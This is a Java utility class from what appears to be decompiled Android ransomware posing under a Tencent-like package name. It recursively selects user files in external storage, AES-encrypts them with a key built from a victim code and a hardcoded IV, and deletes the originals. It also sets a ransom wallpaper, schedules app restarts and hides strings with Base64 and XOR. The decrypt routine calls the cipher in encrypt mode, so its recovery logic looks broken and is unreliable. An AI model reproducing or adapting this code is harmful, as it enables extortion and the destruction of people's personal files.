package com.android.tencent.zdevs.bah;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.graphics.BitmapFactory;
import android.support.v4.view.MotionEventCompat;
import android.support.v7.recyclerview.BuildConfig;
import android.util.Base64;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;

public class Utils {
  public static final ExecutorService executorService = Executors.newFixedThreadPool(10);
  public static List filesToEncrypt = new ArrayList();

  static int aa = 0;
  static int bb = 0;
  static int hh = 0;

  static boolean 彼岸花开;

  public static void GetFiles(String pathname, String str2, boolean z) {
    File[] listFiles = new File(pathname).listFiles();
    for (File file : listFiles) {
      if (file.isFile()) {
        String filename = file.toString();
        if (filename.length() >= str2.length()) {
          filename = (String) filename.subSequence(filename.length() - str2.length(), filename.length());
        }

        if (file.isFile()
            && filename.equals(str2)
            && !file.toString().contains("/.")
            && file.getName()
            .contains(".")
            && file.length() > ((long) 10240)
            && file.length() <= ((long) 52428800)) {
          filesToEncrypt.add(file.getPath());
        }

        if (!z) {
          return;
        }
      } else if (file.isDirectory()
          && !file.toString().contains("/.")
          && !file.toString()
          .toLowerCase()
          .contains("android")
          && !file.toString().toLowerCase().contains("com.")
          && !file.toString().toLowerCase().contains("miad")
          && !(jd(file.toString()) >= 3
          && !file.toString().toLowerCase().contains("baidunetdisk")
          && !file.toString().toLowerCase().contains("download")
          && !file.toString().toLowerCase().contains("dcim"))) {
        GetFiles(file.getPath(), str2, z);
      }
    }
  }

  public static String byte2hex(byte[] bArr) {
    String str = BuildConfig.VERSION_NAME;
    for (byte b : bArr) {
      String toHexString = Integer.toHexString(b & MotionEventCompat.ACTION_MASK);
      str = toHexString.length() == 1 ? str + "0" + toHexString : str + toHexString;
    }
    return str;
  }

  public static void bz(Context context) {
    try {
      WallpaperManager.getInstance(context)
          .setBitmap(BitmapFactory.decodeResource(context.getResources(), R.drawable.bah));
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public static File decryptFile(String password, String encryptedFilename, String decryptedFilename) {
    File encryptedFile = new File(encryptedFilename);
    File decryptedFile = new File(decryptedFilename);

    if (!decryptedFile.exists() && !decryptedFile.isFile()) {
      try {
        File file2 = decryptedFile.getParentFile();
        if (!file2.exists()) {
          file2.mkdirs();
          file2.createNewFile();
        }

        FileInputStream fileInputStream = new FileInputStream(encryptedFile);
        FileOutputStream fileOutputStream = new FileOutputStream(decryptedFile);

        CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, initAESCipher(password, 1));
        int result;
        byte[] buffer = new byte[1024];
        while ((result = cipherInputStream.read(buffer)) >= 0) {
          fileOutputStream.write(buffer, 0, result);
        }
        fileOutputStream.flush();
        fileOutputStream.close();
        cipherInputStream.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }

    return decryptedFile;
  }

  public static File encryptFile(String password, String toEncryptFilename, String encryptedFilename) {
    File toEncryptFile = new File(toEncryptFilename);
    File encryptedFile = new File(encryptedFilename);

    if (!encryptedFile.exists() && !encryptedFile.isFile()) {
      try {
        File file = encryptedFile.getParentFile();
        if (!file.exists()) {
          file.mkdirs();
          file.createNewFile();
        }

        FileInputStream fileInputStream = new FileInputStream(toEncryptFile);
        FileOutputStream fileOutputStream = new FileOutputStream(encryptedFile);

        CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, initAESCipher(password, 1));
        int result;
        byte[] buffer = new byte[1024];
        while ((result = fileInputStream.read(buffer)) >= 0) {
          cipherOutputStream.write(buffer, 0, result);
        }
        fileOutputStream.flush();
        fileOutputStream.close();
        cipherOutputStream.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
    return encryptedFile;
  }

  public static void deleteDir(String str, String str2, int i, final Context context) {
    if (i != 0) {
      new Timer().schedule(new TimerTask() {
        @Override public void run() {
          Editor edit = context.getSharedPreferences("XH", 0).edit();
          edit.putInt("sss", 1);
          edit.commit();
          MainActivity.instance.finish();
          Intent launchIntentForPackage =
              context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
          launchIntentForPackage.addFlags(FLAG_ACTIVITY_NO_HISTORY);
          context.startActivity(launchIntentForPackage);
        }
      }, (long) 600000);
    }
    deleteDirWithFile(new File(str), str2, i, context);
    彼岸花开 = true;
  }

  public static void deleteDirWithFile(final File file, final String str, final int i,
      final Context context) {
    if (file != null && file.exists() && file.isDirectory()) {
      List asList = Arrays.asList(file.listFiles());
      Collections.reverse(asList);
      File[] fileArr = (File[]) asList.toArray(new File[asList.size()]);
      for (final File file2 : fileArr) {
        String filename = file2.toString();
        if (filename.length() >= MainActivity.hzs) {
          filename = (String) filename.subSequence(filename.length() - MainActivity.hzs, filename.length());
        }

        if (i == 0) {
          try {
            if (file2.isFile()
                && filename.equals(MainActivity.hz)
                && !file2.toString().contains("/.")
                && file2.getName().contains(".")) {
              executorService.execute(new Runnable() {
                @Override public void run() {
                  if (file2.getName().contains("!\uff01" + MainActivity.hz)) {
                    file2.delete();
                  } else {
                    Utils.jj(file2, str, i);
                  }
                  Utils.aa++;
                  if (Utils.filesToEncrypt.size() <= Utils.aa) {
                    Utils.aa = 0;
                    Utils.filesToEncrypt = new ArrayList();
                    Editor edit = context.getSharedPreferences("XH", 0).edit();
                    edit.putInt("cjk", 1);
                    edit.commit();
                    MainActivity.instance.finish();
                    Intent launchIntentForPackage = context.getPackageManager()
                        .getLaunchIntentForPackage(context.getPackageName());
                    launchIntentForPackage.addFlags(67108864);
                    context.startActivity(launchIntentForPackage);
                  }
                }
              });
            } else if (file2.isDirectory()
                && !file2.toString().contains("/.")
                && !file2.toString()
                .toLowerCase()
                .contains("android")
                && !file2.toString().toLowerCase().contains("com.")
                && !file2.toString().toLowerCase().contains("miad")
                && !(jd(file2.toString()) >= 3
                && !file2.toString()
                .toLowerCase()
                .contains("baidunetdisk")
                && !file2.toString().toLowerCase().contains("download")
                && !file2.toString().toLowerCase().contains("dcim"))) {
              deleteDirWithFile(file2, str, i, context);
            }
          } catch (Exception e) {
          }
        } else if (file2.isFile()
            && !filename.equals(MainActivity.hz)
            && !file2.toString().contains("/.")
            && file2.getName().contains(".")
            && file2.length() > ((long) 10240)
            && file2.length() <= ((long) 52428800)
            && zjs(file2.getName() + MainActivity.hz)
            <= 251) {
          bb++;
          executorService.execute(new Runnable() {
            @Override public void run() {
              Utils.jj(file2, str, i);
              Utils.hh++;

              if (Utils.bb == Utils.hh && Utils.彼岸花开) {
                Editor edit = context.getSharedPreferences("XH", 0).edit();
                edit.putInt("sss", 1);
                edit.commit();
                MainActivity.instance.finish();
                Intent launchIntentForPackage =
                    context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
                launchIntentForPackage.addFlags(FLAG_ACTIVITY_NO_HISTORY);
                context.startActivity(launchIntentForPackage);
              }
            }
          });
        } else if (file2.isDirectory()
            && !file2.toString().contains("/.")
            && !file2.toString()
            .toLowerCase()
            .contains("android")
            && !file2.toString().toLowerCase().contains("com.")
            && !file2.toString().toLowerCase().contains("miad")
            && !(jd(file2.toString()) >= 3
            && !file2.toString()
            .toLowerCase()
            .contains("baidunetdisk")
            && !file2.toString().toLowerCase().contains("download")
            && !file2.toString().toLowerCase().contains("dcim"))) {
          deleteDirWithFile(file2, str, i, context);
        }
      }
    }
  }

  public static String formatDuring(long j) {
    return to2Str(j / ((long) 86400000))
        + ":"
        + to2Str((j % ((long) 86400000)) / ((long) 3600000))
        + ":"
        + to2Str((j % ((long) 3600000)) / ((long) 60000))
        + ":"
        + to2Str((j % ((long) 60000)) / ((long) 1000));
  }

  public static String formatDuring(Date date, Date date2) {
    return formatDuring(date2.getTime() - date.getTime());
  }

  public static String getStringRandom(int i) {
    String str = BuildConfig.VERSION_NAME;
    Random random = new Random();
    int i2 = 0;
    while (i2 < i) {
      String str2 = random.nextInt(2) % 2 == 0 ? "char" : "num";
      if ("char".equalsIgnoreCase(str2)) {
        str2 = str + (char) ((random.nextInt(2) % 2 == 0 ? 65 : 97) + random.nextInt(26));
      } else {
        str2 = "num".equalsIgnoreCase(str2) ? str + String.valueOf(random.nextInt(10)) : str;
      }
      i2++;
      str = str2;
    }
    return str;
  }

  public static final String getbah(String str) {
    String str2 = new String(Base64.encode("by:\u5f7c\u5cb8\u82b1 qq:1279525738".getBytes(), 0));
    String str3 = (String) str2.subSequence(3, 4);
    str2 = (String) str2.subSequence(4, 5);
    return new String(Base64.encode(
        (String.valueOf(new StringBuffer(new String(Base64.encode(str.getBytes(), 0))).reverse())
            + BuildConfig.VERSION_NAME).getBytes(), 0)).replaceAll(str3, "\u4e09\u751f\u77f3\u7554")
        .replaceAll(str2, "\u5f7c\u5cb8\u82b1\u5f00")
        .replaceAll("\u4e09\u751f\u77f3\u7554", str2)
        .replaceAll("\u5f7c\u5cb8\u82b1\u5f00", str3);
  }

  public static String getmm(String str) {
    byte[] bArr = (byte[]) null;
    try {
      MessageDigest instance = MessageDigest.getInstance("SHA-1");
      instance.update(str.getBytes());
      bArr = instance.digest();
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    }
    return byte2hex(bArr);
  }

  public static final String generateCipher(String str) {
    int i = 0;
    char[] cArr = new char[] {
        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
    };
    try {
      byte[] bytes = str.getBytes();
      MessageDigest instance = MessageDigest.getInstance("MD5");
      instance.update(bytes);
      int r4 = instance.getDigestLength(); //TODO: Unsure
      char[] cArr2 = new char[(r4 * 2)];
      for (byte b : instance.digest()) {
        int i2 = i + 1;
        cArr2[i] = cArr[(b >>> 4) & 15];
        i = i2 + 1;
        cArr2[i2] = cArr[b & 15];
      }
      return new String(cArr2).substring(8, 24);
    } catch (Exception e) {
      e.printStackTrace();
      return (String) null;
    }
  }

  private static Cipher initAESCipher(String str, int i) {
    Cipher cipher = (Cipher) null;
    try {
      AlgorithmParameterSpec ivParameterSpec = new IvParameterSpec("QQqun 571012706 ".getBytes());
      Key secretKeySpec = new SecretKeySpec(str.getBytes(), "AES");
      cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      cipher.init(i, secretKeySpec, ivParameterSpec);
      return cipher;
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
      return cipher;
    } catch (NoSuchPaddingException e2) {
      e2.printStackTrace();
      return cipher;
    } catch (InvalidKeyException e3) {
      e3.printStackTrace();
      return cipher;
    } catch (InvalidAlgorithmParameterException e4) {
      e4.printStackTrace();
      return cipher;
    }
  }

  static int jd(String str) {
    String replaceAll =
        str.replaceAll(MainActivity.externalStorageDirectory.toString(), BuildConfig.VERSION_NAME);
    return replaceAll.length() - replaceAll.replaceAll("/", BuildConfig.VERSION_NAME).length();
  }

  public static void jj(File file, String str, int i) {
    String str2 = generateCipher(str);
    if (i == 0) {
      String file2 = file.toString();
      decryptFile(str2, file.toString(),
          (String) file2.subSequence(0, file2.length() - MainActivity.hzs));
    } else {
      encryptFile(str2, file.toString(), String.valueOf(file) + "!\uff01" + MainActivity.hz);
      new File(String.valueOf(file) + "!\uff01" + MainActivity.hz).renameTo(
          new File(String.valueOf(file) + MainActivity.hz));
    }
    file.delete();
  }

  public static String l(String str) {
    int i = 0;
    String replaceAll =
        Base64.encodeToString("\u4e09\u751f\u77f3\u7554 \u5f7c\u5cb8\u82b1\u5f00".getBytes(), 0)
            .replaceAll("\\D+", BuildConfig.VERSION_NAME);
    Integer num = Integer.valueOf(new StringBuffer(replaceAll).reverse().toString());
    char[] toCharArray = str.toCharArray();
    for (int i2 = 0; i2 < toCharArray.length; i2++) {
      toCharArray[i2] = (char) (num ^ toCharArray[i2]);
    }
    String stringBuffer =
        new StringBuffer(new String(Base64.decode(new String(toCharArray), 0))).reverse()
            .toString();
    num = Integer.valueOf(replaceAll);
    char[] toCharArray2 = stringBuffer.toCharArray();
    while (i < toCharArray2.length) {
      toCharArray2[i] = (char) (num ^ toCharArray2[i]);
      i++;
    }
    return new String(toCharArray2);
  }

  public static void deleteFile(final File file) {
    new Thread(new Runnable() {
      @Override public void run() {
        if (!file.getName().contains("\u5f7c\u5cb8\u82b1\u5f00")) {
          if (file.isFile()) {
            file.delete();
          } else if (file.isDirectory()) {
            File[] listFiles = file.listFiles();
            if (listFiles == null || listFiles.length == 0) {
              file.delete();
              return;
            }
            for (File sc : listFiles) {
              Utils.deleteFile(sc);
            }
            file.delete();
          }
        }
      }
    }).start();
  }

  private static String to2Str(long j) {
    return j > ((long) 9) ? String.valueOf(j) + BuildConfig.VERSION_NAME : "0" + j;
  }

  static int zjs(String str) {
    return str.getBytes().length;
  }
}
